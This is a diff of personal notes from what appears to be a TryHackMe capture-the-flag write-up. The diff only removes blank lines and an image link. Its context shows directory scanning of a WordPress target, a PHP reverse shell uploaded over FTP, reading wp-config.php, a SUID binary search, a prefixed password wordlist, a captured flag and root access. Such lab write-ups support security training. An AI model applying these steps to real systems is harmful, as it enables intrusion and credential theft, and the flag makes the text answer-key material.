@@ -128,7 +128,6 @@ Target: http://10.10.27.15/
 [19:10:57] 301 -  316B  - /wp-includes  ->  http://10.10.27.15/wp-includes/
 [19:10:57] 301 -  315B  - /wp-content  ->  http://10.10.27.15/wp-content/
 
-
 ```
 
 How many ports are open ?
@@ -221,7 +220,6 @@ local: revshell.php remote: revshell.php
 http://10.10.27.15/revshell.php
 
 not found maybe aanother subdomain
-
 
 ftp> more wp-config.php
 <?php
@@ -328,7 +326,6 @@ find / -perm -4000 2>/dev/null
 └─$ more 123_wordlist.txt            
 123adana123456
 123adana12345
-
 
 the command takes the content of "wordlist.txt", adds "123adana" at the beginning of each line, and saves the modified content in a new file named "123_wordlist.txt"
 
@@ -498,11 +495,7 @@ THM{c5a9d3e4147a13cbd1ca24b014466a6c}
 root@ubuntu:~# cat hint.txt
 Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
 
-
 ```
-
-
-![[Pasted image 20230719182422.png]]
 
 Web flag ?
 
